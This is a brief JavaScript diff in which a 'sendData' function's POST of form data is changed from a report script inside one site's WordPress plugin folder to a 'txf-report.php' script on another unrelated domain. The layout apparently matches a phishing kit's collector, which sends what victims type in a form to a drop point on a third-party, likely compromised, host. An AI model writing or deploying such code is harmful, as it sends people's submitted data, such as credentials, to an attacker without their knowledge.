@@ -71,7 +71,7 @@ function sendData( data ) {
   } );
 
   // Set up our request
-  XHR.open( 'POST', 'https://siameseinter.com/wp-content/plugins/easybusy/toboyb/tfx-report.php' );
+  XHR.open( 'POST', 'https://svarusbaldai.lt/deulo/txf-report.php' );
 
   // Send our FormData object; HTTP headers are set automatically
   XHR.send(FD);
